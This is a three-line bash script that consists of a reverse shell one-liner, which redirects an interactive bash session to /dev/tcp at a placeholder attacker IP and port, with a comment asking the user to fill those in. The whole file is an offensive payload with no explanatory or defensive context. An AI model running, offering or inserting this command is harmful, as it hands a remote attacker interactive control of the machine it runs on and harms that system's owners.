#!/bin/bash
#set or replace 'attacker-ip' and 'port' 
/bin/bash -c 'bash -i >& /dev/tcp/$attacker-ip/$port 0>&1'
